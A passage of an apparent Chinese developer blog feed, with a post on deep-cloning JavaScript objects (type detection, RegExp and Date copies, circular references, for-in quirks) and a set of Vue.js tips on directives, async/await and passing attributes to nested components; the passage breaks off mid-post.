    <title>深度克隆</title>
    <link href="http://lry1994.github.io/study/2018/4/deepClone.html"/>
    <id>http://lry1994.github.io/study/2018/4/deepClone.html</id>
    <published>2018-04-25T16:00:00.000Z</published>
    <updated>2018-04-26T10:25:25.315Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一种方法（只适用于基础类型）"><a href="#第一种方法（只适用于基础类型）" class="headerlink" title="第一种方法（只适用于基础类型）"></a>第一种方法（只适用于基础类型）</h2><p> <code>const newObj = JSON.parse(JSON.stringify(oldObj));</code></p><h2 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h2><p>实现对函数 、RegExp等特殊对象的克隆，保留对象的constructor,对象有循环引用也不会报错</p><p>参考 <a href="https://juejin.im/post/5abb55ee6fb9a028e33b7e0a" target="_blank" rel="noopener">https://juejin.im/post/5abb55ee6fb9a028e33b7e0a</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getType = <span class="function">(<span class="params">obj</span>)=&gt;</span> &#123;</span><br><span class="line"><span class="keyword">var</span> toString = <span class="built_in">Object</span>.prototype.toString;</span><br><span class="line"><span class="keyword">var</span> map = &#123;</span><br><span class="line">    <span class="string">'[object Boolean]'</span>  : <span class="string">'boolean'</span>, </span><br><span class="line">    <span class="string">'[object Number]'</span>   : <span class="string">'number'</span>, </span><br><span class="line">    <span class="string">'[object String]'</span>   : <span class="string">'string'</span>, </span><br><span class="line">    <span class="string">'[object Function]'</span> : <span class="string">'function'</span>, </span><br><span class="line">    <span class="string">'[object Array]'</span>    : <span class="string">'array'</span>, </span><br><span class="line">    <span class="string">'[object Date]'</span>     : <span class="string">'date'</span>, </span><br><span class="line">    <span class="string">'[object RegExp]'</span>   : <span class="string">'regExp'</span>, </span><br><span class="line">    <span class="string">'[object Undefined]'</span>: <span class="string">'undefined'</span>,</span><br><span class="line">    <span class="string">'[object Null]'</span>     : <span class="string">'null'</span>, </span><br><span class="line">        <span class="string">'[object Object]'</span>   : <span class="string">'object'</span>,</span><br><span class="line">        <span class="string">'[object Symbol]'</span>   : <span class="string">'symbol'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span>(obj <span class="keyword">instanceof</span> Element) &#123;<span class="comment">//因为对不同标签，toString会返回对应不同标签的构造函数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'element'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> map[toString.call(obj)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getRegExp = <span class="function"><span class="params">re</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> flags = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">if</span> (re.global) flags += <span class="string">'g'</span>;</span><br><span class="line">  <span class="keyword">if</span> (re.ignoreCase) flags += <span class="string">'i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (re.multiline) flags += <span class="string">'m'</span>;</span><br><span class="line">  <span class="keyword">return</span> flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* deep clone</span></span><br><span class="line"><span class="comment">* @param  &#123;[type]&#125; parent object 需要进行克隆的对象</span></span><br><span class="line"><span class="comment">* @return &#123;[type]&#125;        深克隆后的对象</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> deepClone = <span class="function"><span class="params">oldObj</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 维护两个储存循环引用的数组</span></span><br><span class="line">  <span class="keyword">const</span> oldObjArr = [];</span><br><span class="line">  <span class="keyword">const</span> newObjArr = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> clone = <span class="function"><span class="params">oldObj</span> =&gt;</span> &#123; </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">let</span> newObj, proto;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> type = getType(oldObj);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(type)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'boolean'</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'number'</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'string'</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'null'</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'undefined'</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'function'</span>:&#123;</span><br><span class="line">            <span class="keyword">return</span> oldObj;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'symbol'</span>:&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">Symbol</span>(<span class="built_in">Symbol</span>.keyFor(oldObj).toString());</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'array'</span>:&#123;</span><br><span class="line">            newObj = [];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'regExp'</span>:&#123;</span><br><span class="line">            newObj = <span class="keyword">new</span> <span class="built_in">RegExp</span>(oldObj.source, getRegExp(oldObj));</span><br><span class="line">            <span class="keyword">if</span> (oldObj.lastIndex) newObj.lastIndex = oldObj.lastIndex;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'date'</span>:&#123;</span><br><span class="line">            newObj = <span class="keyword">new</span> <span class="built_in">Date</span>(oldObj.getTime());            </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//case 'obj':</span></span><br><span class="line">        <span class="keyword">default</span>:&#123;</span><br><span class="line">            <span class="comment">// 处理对象原型</span></span><br><span class="line">            proto = <span class="built_in">Object</span>.getPrototypeOf(oldObj);</span><br><span class="line">            <span class="comment">// 利用Object.create切断原型链</span></span><br><span class="line">            newObj = <span class="built_in">Object</span>.create(proto);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 处理循环引用</span></span><br><span class="line">   <span class="keyword">const</span> index = oldObjArr.indexOf(oldObj);</span><br><span class="line">   <span class="keyword">if</span> (index != <span class="number">-1</span>) &#123;<span class="comment">// 如果父数组存在本对象,说明之前已经被引用过,直接返回此对象    </span></span><br><span class="line">     <span class="keyword">return</span> newObjArr[index];</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   oldObjArr.push(oldObj);</span><br><span class="line">   newObjArr.push(newObj);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> oldObj) &#123;<span class="comment">// 递归   ,这里数组和对象都可以用forin语句，但是数组使用forin会有一个问题，具体看最下面。但是这里不会影响  </span></span><br><span class="line">     newObj[i] = clone(oldObj[i]);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> newObj;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> clone(oldObj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">测试通过</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params">pname</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = pname;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> Messi = <span class="keyword">new</span> person(<span class="string">'Messi'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hi'</span>);</span><br><span class="line">&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> oldObj = &#123;</span><br><span class="line">    a: say,</span><br><span class="line">    b: <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>),</span><br><span class="line">    c: <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'ab+c'</span>, <span class="string">'i'</span>),</span><br><span class="line">    d: Messi</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> newObj = deepClone(oldObj);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">console</span>.log(newObj.a, oldObj.a); <span class="comment">//[Function: say] [Function: say]</span></span><br><span class="line">  <span class="built_in">console</span>.log(newObj.b[<span class="number">0</span>], oldObj.b[<span class="number">0</span>]); <span class="comment">// undefined undefined</span></span><br><span class="line">  <span class="built_in">console</span>.log(newObj.c, oldObj.c); <span class="comment">// /ab+c/i /ab+c/i</span></span><br><span class="line">  <span class="built_in">console</span>.log(newObj.d.constructor, oldObj.d.constructor); <span class="comment">// [Function: person][Function: person]</span></span><br></pre></td></tr></table></figure><h2 id="toString和typeof区别"><a href="#toString和typeof区别" class="headerlink" title="toString和typeof区别"></a>toString和typeof区别</h2><p>之前一直不知道这两个有什么区别，所以这次好好研究一下，探索出来这样的关系<br> <img src="/study/2018/4/deepClone/toString_typeof.png"></p><p>下面是一些测试例子<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> toString = <span class="built_in">Object</span>.prototype.toString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a= <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a));<span class="comment">//boolean</span></span><br><span class="line"><span class="built_in">console</span>.log(toString.call(a));<span class="comment">//[object Boolean]</span></span><br><span class="line"></span><br><span class="line">a=<span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a));<span class="comment">//object </span></span><br><span class="line"><span class="built_in">console</span>.log(toString.call(a));<span class="comment">//[object Boolean]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'ab+c'</span>, <span class="string">'i'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(a.source)<span class="comment">//ab+c</span></span><br><span class="line"><span class="built_in">console</span>.log(a.global)<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(a.ignoreCase)<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(a.multiline)<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(a.lastIndex)<span class="comment">//0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a));<span class="comment">//object</span></span><br><span class="line"><span class="built_in">console</span>.log(toString.call(a));<span class="comment">//[object RegExp]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hi'</span>);</span><br><span class="line">&#125;;</span><br><span class="line">a=say;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a));<span class="comment">//function</span></span><br><span class="line"><span class="built_in">console</span>.log(toString.call(a));<span class="comment">//[object Function]</span></span><br><span class="line"></span><br><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">(<span class="keyword">let</span> i <span class="keyword">in</span> a)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(a[i])</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a));<span class="comment">//object</span></span><br><span class="line"><span class="built_in">console</span>.log(toString.call(a));<span class="comment">//[object Array]</span></span><br><span class="line"></span><br><span class="line">a=<span class="built_in">Symbol</span>(<span class="string">'foo'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a));<span class="comment">//symbol</span></span><br><span class="line"><span class="built_in">console</span>.log(toString.call(a));<span class="comment">//[object Symbol]</span></span><br></pre></td></tr></table></figure></p><h2 id="数组使用for-in"><a href="#数组使用for-in" class="headerlink" title="数组使用for in"></a>数组使用for in</h2><p>for in函数中变量以字符串的形式出现，这时候在函数中操作a[x+1]的话是无效的，x+1会进行字符串拼接。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=[<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">var</span> x=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> x);<span class="comment">//number</span></span><br><span class="line">        <span class="keyword">for</span> (x <span class="keyword">in</span> a) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"a["</span>+x+<span class="string">"]: "</span>+a[x]);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">typeof</span> x);<span class="comment">//string</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(x);<span class="comment">//4</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> x);<span class="comment">//string</span></span><br><span class="line"><span class="comment">//output:</span></span><br><span class="line"><span class="comment">//        a[0]: 5</span></span><br><span class="line"><span class="comment">//        a[1]: 4</span></span><br><span class="line"><span class="comment">//        a[2]: 3</span></span><br><span class="line"><span class="comment">//        a[3]: 2</span></span><br><span class="line"><span class="comment">//        a[4]: 1</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第一种方法（只适用于基础类型）&quot;&gt;&lt;a href=&quot;#第一种方法（只适用于基础类型）&quot; class=&quot;headerlink&quot; title=&quot;第一种方法（只适用于基础类型）&quot;&gt;&lt;/a&gt;第一种方法（只适用于基础类型）&lt;/h2&gt;&lt;p&gt; &lt;code&gt;const newOb
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="专题笔记" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E4%B8%93%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>2018-4总结</title>
    <link href="http://lry1994.github.io/study/2018/4/suibi.html"/>
    <id>http://lry1994.github.io/study/2018/4/suibi.html</id>
    <published>2018-03-31T16:00:00.000Z</published>
    <updated>2018-08-30T02:32:56.365Z</updated>
    
    <content type="html"><![CDATA[<h3 id="实现QQ弹窗-和QQ号为qqnum聊天"><a href="#实现QQ弹窗-和QQ号为qqnum聊天" class="headerlink" title="实现QQ弹窗 和QQ号为qqnum聊天"></a>实现QQ弹窗 和QQ号为qqnum聊天</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">:href</span>=<span class="string">"`http://wpa.qq.com/msgrd?v=3&amp;uin=$&#123;qqnum&#125;&amp;site=qq&amp;menu=yes`"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">:src</span>=<span class="string">"`http://wpa.qq.com/pa?p=2:1424314130:51`"</span> <span class="attr">alt</span>=<span class="string">"点击这里给我发消息"</span> <span class="attr">title</span>=<span class="string">"点击这里给我发消息"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Vue全局过滤器也可以当函数使用"><a href="#Vue全局过滤器也可以当函数使用" class="headerlink" title="Vue全局过滤器也可以当函数使用"></a>Vue全局过滤器也可以当函数使用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$options.filters.dateformat</span><br></pre></td></tr></table></figure><h3 id="字符串转义问题"><a href="#字符串转义问题" class="headerlink" title="字符串转义问题"></a>字符串转义问题</h3><p>本地字符串不会自己转义，所以本地需要写成 “\d”</p><p>后台请求返回的字符串会自动帮你转义，所以在后台数据库只需要写成”\d”</p><h3 id="如何解决vue父组件模板slot到孙子组件中去"><a href="#如何解决vue父组件模板slot到孙子组件中去" class="headerlink" title="如何解决vue父组件模板slot到孙子组件中去"></a>如何解决vue父组件模板slot到孙子组件中去</h3><pre><code>&gt;每一个被继承的组件都需要有slot;</code></pre><p><a href="https://segmentfault.com/q/1010000012141592" target="_blank" rel="noopener">参考链接</a></p><h3 id="记录一下第一次使用async-await-解决了困扰我一早上的异步问题-赞！！！"><a href="#记录一下第一次使用async-await-解决了困扰我一早上的异步问题-赞！！！" class="headerlink" title="记录一下第一次使用async ,await ,解决了困扰我一早上的异步问题,赞！！！"></a>记录一下第一次使用async ,await ,解决了困扰我一早上的异步问题,赞！！！</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取文件信息</span></span><br><span class="line"> getFileInfo(item)&#123;</span><br><span class="line">     <span class="keyword">let</span> fileId= item.value;</span><br><span class="line">     <span class="keyword">const</span> downloadLink =<span class="string">`/gw/tenant/worksheet/extend/Download?worksheetInfoId=<span class="subst">$&#123;item.worksheetInfoId&#125;</span>&amp;blobId=offer.info`</span>;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class="line">         <span class="keyword">if</span>(fileId == <span class="string">'undefined'</span>) resolve(<span class="literal">null</span>);</span><br><span class="line">         <span class="keyword">this</span>._$http.tenant.offerExtendGetFileInfo(&#123;<span class="attr">fileId</span>: fileId&#125;)</span><br><span class="line">         .then(<span class="function"><span class="params">res</span>=&gt;</span>&#123; </span><br><span class="line">             res=&#123;...res,downloadLink&#125;;</span><br><span class="line">             resolve(res)</span><br><span class="line">         &#125;) </span><br><span class="line">     &#125;)           </span><br><span class="line"> &#125;,</span><br><span class="line"> <span class="comment">//获取文件信息</span></span><br><span class="line"> fileGetter: <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;           </span><br><span class="line">     <span class="keyword">const</span> fileInfo = <span class="keyword">await</span> <span class="keyword">this</span>.getFileInfo(item);</span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(fileInfo);         </span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure><h3 id="自定义指令—解决跟dom有关的问题"><a href="#自定义指令—解决跟dom有关的问题" class="headerlink" title="自定义指令—解决跟dom有关的问题"></a>自定义指令—解决跟dom有关的问题</h3><p>最大的用处就是可以引用一些第三方的代码插入到Vue项目中，比如有一个操作dom的函数：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当然，真实情况第三方的代码要复杂的多</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeColor</span>(<span class="params">dom</span>)</span>&#123;</span><br><span class="line">    dom.style.backgroundColor = <span class="string">"red"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以注册一个全局的指令来为需要执行changeColor方法的dom提供指令：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Vue.directives(<span class="string">'color'</span>,&#123;</span><br><span class="line">    bind:<span class="function"><span class="keyword">function</span>(<span class="params">el</span>)</span>&#123;</span><br><span class="line">        changeColor(el)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>这样，如果需要这个dom改变颜色的话，只需要这样即可：<br><code>&lt;div v-color&gt;改变颜色&lt;/div&gt;</code></p><p>当日常开发遇到跟dom有关的问题却一筹莫展时，可以想想自定义指令是否有功能可以解决为题</p><h3 id="父组件给子组件传值，这个值还要从子组件传给它的子组件【inheritAttrs】和【attrs】"><a href="#父组件给子组件传值，这个值还要从子组件传给它的子组件【inheritAttrs】和【attrs】" class="headerlink" title="父组件给子组件传值，这个值还要从子组件传给它的子组件【inheritAttrs】和【attrs】"></a>父组件给子组件传值，这个值还要从子组件传给它的子组件【inheritAttrs】和【attrs】</h3><p>直接一层一层传prop非常麻烦.<br>Vue提供了【inheritAttrs】和【attrs】两个功能来解决这样的问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//父组件</span><br><span class="line">&lt;template&gt;</span><br><span class="line">   &lt;div&gt;</span><br><span class="line">     &lt;child :text=&quot;text&quot;  :count=&quot;count&quot;&gt;&lt;/child&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default&#123;</span><br><span class="line">        data()&#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                text:&quot;父组件的值&quot;，</span><br><span class="line">                count:123456，</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//子组件</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;&#123;&#123;text&#125;&#125;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default&#123;</span><br><span class="line">        props:[&quot;text&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这里父组件的count属性仅仅挂在子组件上，并没有使用。此时我们打开浏览器，可以看到子组件的dom上显示的展示了<code>&lt;div class=&#39;child&#39; count=&quot;123456&quot;&gt;&lt;/div&gt;</code>。</p><p>此时，我们可以通过设置inheritAttrs: false来取消这种默认行为：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data()&#123;</span><br><span class="line">  <span class="keyword">return</span>&#123;</span><br><span class="line">    ......   </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inheritAttrs: <span class="literal">false</span>,</span><br><span class="line">mounted()&#123;</span><br><span class="line">　　<span class="built_in">console</span>.log(<span class="keyword">this</span>.$attrs); <span class="comment">//&#123;count:123456&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这时再看dom上就没有count属性了。然后，我还打印了this.$attrs的值，值为一个包含着count键值对的Object。<br>也就是说，<code>父组件没有props的属性值会被保存在一个名为$attrs中供子组件使用</code>，然而这并没有解决开头子组件的子组件获取值的问题。<br>别急，我们只需要在子组件上加个东西就可以了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;child&quot;&gt;</span><br><span class="line">        &lt;my-child v-bind=&quot;$attrs&quot;&gt;&lt;/my-child&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></p><p>这样，子组件的子组件也可以获取这个值了。</p><h3 id="provide-inject-更适合用来做父组件给后代组件传值，"><a href="#provide-inject-更适合用来做父组件给后代组件传值，" class="headerlink" title="provide / inject -更适合用来做父组件给后代组件传值，"></a>provide / inject -更适合用来做父组件给后代组件传值，</h3><p>provide/inject方法要比inheritAttrs/attrs更适合用来做父组件给子组件或孙组件传值，<br><a href="https://cn.vuejs.org/v2/api/#provide-inject" target="_blank" 